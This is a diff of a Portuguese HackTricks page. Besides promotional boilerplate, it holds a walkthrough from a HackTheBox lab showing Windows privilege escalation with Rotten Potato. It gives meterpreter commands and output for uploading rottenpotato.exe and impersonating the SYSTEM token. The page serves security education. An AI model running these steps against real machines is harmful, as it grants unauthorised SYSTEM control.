@@ -2,27 +2,27 @@
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-- Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+Outras formas de apoiar o HackTricks:
 
-- Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-
-- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
-
-- **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-
-- **Compartilhe seus truques de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
+* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
-As contas de serviço geralmente possuem privilégios especiais (SeImpersonatePrivileges) e isso pode ser usado para escalar privilégios.
+As informações nesta página foram extraídas [deste post](https://www.absolomb.com/2018-05-04-HackTheBox-Tally/)
+
+Contas de serviço geralmente têm privilégios especiais (SeImpersonatePrivileges) e isso pode ser usado para escalar privilégios.
 
 [https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
 
 Não entrarei em detalhes sobre como esse exploit funciona, o artigo acima explica muito melhor do que eu poderia.
 
-Vamos verificar nossos privilégios com o meterpreter:
+Vamos verificar nossos privilégios com meterpreter:
 ```
 meterpreter > getprivs
 
@@ -38,15 +38,15 @@ SeImpersonatePrivilege
 SeIncreaseQuotaPrivilege
 SeIncreaseWorkingSetPrivilege
 ```
-Excelente, parece que temos os privilégios necessários para realizar o ataque. Vamos fazer o upload do `rottenpotato.exe`.
+Excelente, parece que temos os privilégios necessários para realizar o ataque. Vamos fazer o upload do `rottenpotato.exe`
 
-De volta à nossa sessão do meterpreter, carregamos a extensão `incognito`.
+De volta à nossa sessão meterpreter, carregamos a extensão `incognito`.
 ```
 meterpreter > use incognito
 Loading extension incognito...Success.
 meterpreter > list_tokens -u
 [-] Warning: Not currently running as SYSTEM, not all tokens will beavailable
-             Call rev2self if primary process token is SYSTEM
+Call rev2self if primary process token is SYSTEM
 
 Delegation Tokens Available
 ========================================
@@ -58,14 +58,14 @@ Impersonation Tokens Available
 ========================================
 No tokens available
 ```
-Podemos ver que atualmente não temos Tokens de Impersonação. Vamos executar o exploit Rotten Potato.
+Podemos ver que atualmente não temos Tokens de Impersonation. Vamos executar o exploit Rotten Potato.
 ```
 meterpreter > execute -f rottenpotato.exe -Hc
 Process 3104 created.
 Channel 2 created.
 meterpreter > list_tokens -u
 [-] Warning: Not currently running as SYSTEM, not all tokens will beavailable
-             Call rev2self if primary process token is SYSTEM
+Call rev2self if primary process token is SYSTEM
 
 Delegation Tokens Available
 ========================================
@@ -77,30 +77,28 @@ Impersonation Tokens Available
 ========================================
 NT AUTHORITY\SYSTEM
 ```
-Precisamos rapidamente assumir a identidade do token ou ele desaparecerá.
+Precisamos rapidamente personificar o token ou ele desaparecerá.
 ```
 meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
 [-] Warning: Not currently running as SYSTEM, not all tokens will beavailable
-             Call rev2self if primary process token is SYSTEM
+Call rev2self if primary process token is SYSTEM
 [-] No delegation token available
 [+] Successfully impersonated user NT AUTHORITY\SYSTEM
 meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
 ```
-Sucesso! Temos nosso shell SYSTEM e podemos pegar o arquivo root.txt!
+Sucesso! Conseguimos nosso shell SYSTEM e podemos pegar o arquivo root.txt!
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-- Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+Outras formas de apoiar o HackTricks:
 
-- Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-
-- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
-
-- **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-
-- **Compartilhe seus truques de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [repositório hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
+* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
